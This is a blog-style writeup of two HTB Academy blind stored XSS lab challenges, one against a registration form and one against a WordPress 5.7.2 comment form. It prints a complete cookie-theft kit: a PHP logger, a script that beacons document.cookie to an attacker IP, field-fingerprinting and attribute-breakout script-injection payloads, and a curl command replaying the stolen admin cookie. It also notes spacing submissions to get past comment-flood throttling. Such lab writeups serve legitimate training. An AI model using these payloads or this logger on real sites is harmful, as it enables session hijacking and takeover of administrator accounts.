---
title: "XSS Skills Assessment — Blind XSS"
categories: [Writeups]
date: 2026-08-06 12:30:00 +0700
tags: [xss, blind-xss, session-hijacking, wordpress, cwes]
---

The HTB Academy XSS module ends with two blind XSS challenges. Both hinge on
the same idea: the payload only fires for a privileged user (an Admin) reviewing
submitted content in a page I can't see, so I can't watch my input render and
have to make the vulnerable field *tell me* it fired.

Flag values and captured cookies are redacted here since these are HTB Academy
targets.
{: .prompt-info }

## Setup

One PHP server on my box doubles as the callback catcher and the cookie logger:

```bash
mkdir hijack && cd hijack
php -S 0.0.0.0:8000
```

`index.php` logs any cookie sent via `?c=`:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

`script.js` is the actual exploit, pulled in with `<script src=...>`:

```js
new Image().src='http://10.10.16.230:8000/index.php?c='+document.cookie
```

## Part 1 — the registration form

**Page:** `/hijacking/index.php`, a user registration form (`fullname`,
`username`, `password`, `email`, `imgurl`) reviewed by an Admin in a panel I
have no access to.

### Narrow the candidates

- `email` rejected anything failing an email regex, so skipped it.
- `password` is hashed server-side and never re-rendered, so skipped it.
- Left `fullname`, `username`, `imgurl`.

### Fingerprint the vulnerable field

Registered three throwaway accounts, each putting a callback in a *different*
candidate field with the field name baked into the request path. A single hit
then tells me both that it's vulnerable and which field it was:

```
<script src=http://10.10.16.230:8000/fullname></script>
<script src=http://10.10.16.230:8000/username></script>
<script src=http://10.10.16.230:8000/imgurl></script>
```

Submitted with `curl -G --data-urlencode` (the form uses GET). No hits after
several minutes. Rather than just wait on the admin bot, I hedged with an
**attribute-breakout** variant across all three at once:

```
'><script src=http://10.10.16.230:8000/fullname2></script>
'><script src=http://10.10.16.230:8000/username2></script>
"><script src=http://10.10.16.230:8000/imgurl2></script>
```

Shortly after, the listener logged `/imgurl2`. So **`imgurl`** was vulnerable,
and it needed the `">` breakout — meaning its value lands inside an HTML
attribute (almost certainly `<img src="...">` on the admin's review page), not
raw text.

### Weaponize and hijack

Re-registered with `imgurl` pointing at the real cookie-stealer:

```
"><script src=http://10.10.16.230:8000/script.js></script>
```

The admin's browser loaded `script.js` and beaconed `document.cookie` back:

```
Victim IP: 10.129.234.166 | Cookie: cookie=<redacted>
```

Replayed the cookie straight against the login page:

```bash
curl -s -b "cookie=<redacted>" http://10.129.234.166/hijacking/login.php
```

Response: `Welcome Back Admin` and the flag `HTB{...redacted}`.

## Part 2 — Skills Assessment: WordPress "Security Blog"

**Page:** `/assessment/`, a WordPress 5.7.2 blog with a comment form. Comments
need admin approval, so again the payload only fires when the admin reviews the
comment in `wp-admin`.

### Injectable fields

The comment form (`wp-comments-post.php`) exposes `comment`, `author`, `email`,
and `url` (the commenter's "Website" link). Skipped `email` (format-validated),
kept `comment`, `author`, `url`.

### Fingerprint

Same fan-out, but I went straight to the breakout variant since Part 1 showed
these apps render input inside attributes:

```
comment: <script src=http://10.10.16.230:8000/comment></script>
author:  '><script src=http://10.10.16.230:8000/author></script>
url:     https://example.com/"><script src=http://10.10.16.230:8000/url></script>
```

WordPress's comment flood protection threw `429 Too Many Requests` on
back-to-back submits, so I spaced them ~16s apart to clear the default anti-spam
throttle. Only `/url` came back — the **`url`** field is rendered unescaped
inside an `href="..."` on the moderation page and needed the same `">` breakout.

### Weaponize

New comment with `url` pointing at the cookie-stealer:

```
url: https://example.com/"><script src=http://10.10.16.230:8000/script.js></script>
```

When the admin opened the moderation queue the script ran and exfiltrated the
cookies, including the flag cookie `flag=HTB{...redacted}`.

## Takeaways

- Both were **blind stored XSS**: the payload executes only for a privileged
  user reviewing content in a page the attacker never sees.
- Fan out **one distinguishing payload per candidate field**, each calling back
  with the field name in the path. One hit tells you both "vulnerable" and
  "which field."
- When a plain `<script>` doesn't fire, try an **attribute-breakout** payload
  (`"><script...>` or `'><script...>`) before writing the field off. Both
  vulnerable fields here (`imgurl`, `url`) were reflected inside an attribute.
- Once a callback lands, swap it for a cookie-stealer
  (`new Image().src=...+document.cookie`), wait for the privileged session, and
  replay the cookie against the login page.
